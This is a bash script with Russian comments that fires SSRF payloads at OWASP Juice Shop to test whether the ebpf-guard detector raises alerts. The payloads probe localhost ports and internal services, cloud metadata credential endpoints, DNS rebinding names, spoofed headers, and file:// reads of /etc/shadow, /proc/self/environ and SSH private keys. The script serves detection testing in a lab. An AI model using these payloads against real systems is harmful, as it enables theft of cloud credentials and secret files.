#!/bin/bash
# SSRF (Server-Side Request Forgery) атаки против OWASP Juice Shop
# Цель: Тестирование способности ebpf-guard детектировать SSRF атаки

set -e

VPS_IP="${VPS_IP:-localhost}"
JUICE_SH_URL="http://${VPS_IP}:3000"
EBPF_GUARD_API="http://${VPS_IP}:19090"
EBPF_GUARD_TOKEN="${EBPF_GUARD_TOKEN:-$(grep '^admin=' /var/lib/ebpf-guard/token 2>/dev/null | cut -d= -f2)}"  # persisted at /var/lib/ebpf-guard/token
RESULTS_DIR="./ssrf-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Anchored to this script's directory, not the working directory — see
# sqlmap-attacks.sh for why (plan.md волна 1.5g).
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST_FILE="$SCRIPT_DIR/attack-manifest.json"

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }

mkdir -p "$RESULTS_DIR"

# Записывает категорию атаки и её comm в общий attack-manifest.json
# (plan.md волна 1.5g, вопрос 8) — см. sqlmap-attacks.sh для полного
# описания назначения.
record_manifest() {
    local category="$1" comm="$2"
    local manifest="$MANIFEST_FILE"
    local entry
    entry=$(jq -n --arg cat "$category" --arg comm "$comm" --arg ts "$(date -Iseconds)" \
        '{category: $cat, comm: $comm, timestamp: $ts}' 2>/dev/null) || return 0
    if [ -f "$manifest" ]; then
        jq --argjson e "$entry" '. + [$e]' "$manifest" > "$manifest.tmp" 2>/dev/null && mv "$manifest.tmp" "$manifest"
    else
        echo "[$entry]" | jq '.' > "$manifest" 2>/dev/null
    fi
}

# Attack 1: Localhost scanning через SSRF
attack_localhost_scan() {
    log "==========================================="
    log "ATTACK 1: Localhost Scanning via SSRF"
    log "==========================================="

    local output_file="$RESULTS_DIR/localhost_scan_$TIMESTAMP.txt"

    # Попытки сканирования localhost через различные endpoints
    local ports=("80" "3000" "3001" "9090" "19090" "22" "3306" "6379" "9200" "27017")
    local paths=("/" "/api" "/admin" "/metrics" "/health" "/config")

    for port in "${ports[@]}"; do
        log "Testing localhost:$port"
        curl -s -X GET "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"http://localhost:${port}/\"}" \
            -o /dev/null -w "Port $port: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    # Проверка internal IP ranges
    local internal_ips=("127.0.0.1" "0.0.0.0" "192.168.1.1" "10.0.0.1" "172.16.0.1")
    for ip in "${internal_ips[@]}"; do
        log "Testing internal IP: $ip"
        curl -s -X GET "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"http://${ip}:3000/\"}" \
            -o /dev/null -w "IP $ip: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "Localhost scan завершен. Результаты в $output_file"
}

# Attack 2: Cloud metadata attacks
attack_cloud_metadata() {
    log "==========================================="
    log "ATTACK 2: Cloud Metadata Access"
    log "==========================================="

    local output_file="$RESULTS_DIR/cloud_metadata_$TIMESTAMP.txt"

    # AWS metadata endpoints
    local metadata_urls=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/"
        "http://169.254.169.254/latest/meta-data/identity-credentials/"
        "http://169.254.169.254/latest/user-data"
        "http://169.254.169.254/latest/dynamic/instance-identity/"
    )

    for url in "${metadata_urls[@]}"; do
        log "Testing metadata endpoint: $url"
        curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"$url\"}" \
            -o /dev/null -w "Metadata: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    # GCP metadata
    local gcp_urls=(
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://metadata.google.internal/computeMetadata/v1/instance/"
    )

    for url in "${gcp_urls[@]}"; do
        curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"$url\"}" \
            -o /dev/null -w "GCP: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    # Azure metadata
    curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
        -H "Content-Type: application/json" \
        -d "{\"comment\":\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"}" \
        -o /dev/null -w "Azure: %{http_code}\n" \
        >> "$output_file" 2>&1

    log "Cloud metadata attack завершен. Результаты в $output_file"
}

# Attack 3: File protocol SSRF
attack_file_protocol() {
    log "==========================================="
    log "ATTACK 3: File Protocol SSRF"
    log "==========================================="

    local output_file="$RESULTS_DIR/file_protocol_$TIMESTAMP.txt"

    # Попытки чтения локальных файлов через file://
    local file_paths=(
        "file:///etc/passwd"
        "file:///etc/shadow"
        "file:///etc/hosts"
        "file:///proc/self/environ"
        "file:///proc/self/cmdline"
        "file:///var/log/syslog"
        "file:///etc/nginx/nginx.conf"
        "file:///root/.ssh/id_rsa"
    )

    for path in "${file_paths[@]}"; do
        log "Testing file path: $path"
        curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"$path\"}" \
            -o /dev/null -w "File: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "File protocol attack завершен. Результаты в $output_file"
}

# Attack 4: DNS rebinding attempts
attack_dns_rebinding() {
    log "==========================================="
    log "ATTACK 4: DNS Rebinding Attempts"
    log "==========================================="

    local output_file="$RESULTS_DIR/dns_rebinding_$TIMESTAMP.txt"

    # Попытки через потенциальные уязвимые DNS имена
    local dns_names=(
        "localhost.localdomain"
        "127.0.0.1.nip.io"
        "localtest.me"
        "pointer.to"
        "sslip.io"
        "xip.io"
    )

    for dns in "${dns_names[@]}"; do
        log "Testing DNS name: $dns"
        curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"http://${dns}:3000/\"}" \
            -o /dev/null -w "DNS: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "DNS rebinding attack завершен. Результаты в $output_file"
}

# Attack 5: Internal service enumeration
attack_internal_services() {
    log "==========================================="
    log "ATTACK 5: Internal Service Enumeration"
    log "==========================================="

    local output_file="$RESULTS_DIR/internal_services_$TIMESTAMP.txt"

    # Попытки доступа к внутренним сервисам
    local service_patterns=(
        "http://prometheus:9090"
        "http://grafana:3001"
        "http://consul:8500"
        "http://etcd:2379"
        "http://kubernetes:443"
        "http://redis:6379"
        "http://elasticsearch:9200"
        "http://mongodb:27017"
        "http://mysql:3306"
        "http://postgres:5432"
    )

    for service in "${service_patterns[@]}"; do
        log "Testing service: $service"
        curl -s -X POST "$JUICE_SH_URL/rest/feedback/hidden" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"$service\"}" \
            -o /dev/null -w "Service: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "Internal service enumeration завершен. Результаты в $output_file"
}

# Attack 6: Header-based SSRF
attack_header_ssrf() {
    log "==========================================="
    log "ATTACK 6: Header-based SSRF"
    log "==========================================="

    local output_file="$RESULTS_DIR/header_ssrf_$TIMESTAMP.txt"

    # Попытки через различные headers
    local headers=(
        "X-Original-URL"
        "X-Forwarded-Host"
        "X-Forwarded-For"
        "X-Real-IP"
        "Referer"
        "Origin"
    )

    for header in "${headers[@]}"; do
        log "Testing header: $header"
        curl -s -X GET "$JUICE_SH_URL/rest/products" \
            -H "$header: http://localhost:9090" \
            -o /dev/null -w "Header $header: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "Header-based SSRF завершен. Результаты в $output_file"
}

# Анализ результатов
analyze_results() {
    log "==========================================="
    log "АНАЛИЗ SSRF АТАК"
    log "==========================================="

    local summary_file="$RESULTS_DIR/summary-$TIMESTAMP.txt"

    {
        echo "SSRF ATTACK SUMMARY - $TIMESTAMP"
        echo "========================================"
        echo ""

        # curl's -w "...%{http_code}" writes the resolved numeric status, not
        # the literal string "http_code" — grepping for that always matched 0.
        # Every attack function here writes "<label>: <3-digit code>".
        echo "=== REQUEST STATISTICS ==="
        local total_requests=0
        local zero_request_files=""
        for file in "$RESULTS_DIR"/*_$TIMESTAMP.txt; do
            if [ -f "$file" ] && [[ ! "$file" =~ (summary) ]]; then
                local count=$(grep -cE ': [0-9]{3}$' "$file" 2>/dev/null)
                echo "$(basename $file): $count requests"
                total_requests=$((total_requests + count))
                [ "$count" -eq 0 ] && zero_request_files="$zero_request_files $(basename "$file")"
            fi
        done

        echo ""
        echo "=== REQUEST GATE ==="
        echo "Всего запросов: $total_requests"
        if [ -n "$zero_request_files" ]; then
            echo "GATE: FAILED — файлы с 0 запросов:$zero_request_files"
        else
            echo "GATE: OK — все сценарии отправили >0 запросов"
        fi

        echo ""
        echo "=== NETWORK-RELATED METRICS ==="
        curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/metrics" | grep -E "ssrf|internal_access|localhost_connect" || echo "No SSRF metrics found"

        echo ""
        echo "=== ALERTS RELATED TO SSRF ==="
        curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" | grep -i "ssrf\|localhost\|internal.*access\|metadata" || echo "No SSRF alerts found"

    } | tee "$summary_file"

    log "Summary сохранен в $summary_file"
}

# Главная функция
main() {
    log "==========================================="
    log "SSRF AUTOMATION AGAINST JUICE SHOP"
    log "==========================================="
    log "Juice Shop URL: $JUICE_SH_URL"
    log "ebpf-guard API: $EBPF_GUARD_API"
    log "Results dir: $RESULTS_DIR"
    log "==========================================="
    record_manifest "ssrf" "curl"

    attack_localhost_scan
    attack_cloud_metadata
    attack_file_protocol
    attack_dns_rebinding
    attack_internal_services
    attack_header_ssrf

    analyze_results

    log "==========================================="
    log "ВСЕ SSRF АТАКИ ЗАВЕРШЕНЫ"
    log "==========================================="
    log "Результаты сохранены в: $RESULTS_DIR"
}

# Запуск
main "$@"
